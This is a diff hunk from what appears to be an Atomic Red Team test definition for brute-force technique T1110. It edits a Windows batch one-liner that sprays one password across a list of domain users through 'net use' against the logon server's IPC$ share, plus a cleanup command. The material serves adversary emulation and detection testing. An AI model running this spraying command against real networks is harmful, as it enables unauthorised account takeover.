@@ -21,6 +21,6 @@ atomic_tests:
     elevation_required: false
     command: |
       PathToAtomicsFolder\T1110\src\create_user_list.bat
-      @FOR /F %n in (%temp%\users.txt) do @echo . & @net use %logonserver%\IPC$ /user:%userdomain%\%n "#{password}" 1>NUL 2>&1 && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
+      @FOR /F %n in (%temp%\users.txt) do @echo . & @net use %logonserver%\IPC$ /user:%userdomain%\"%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
     cleanup_command:
       del %temp%\1.txt >nul 2>&1 & del %temp%\2.txt >nul 2>&1 & del %temp%\3.txt >nul 2>&1 & del %temp%\users.txt >nul 2>&1
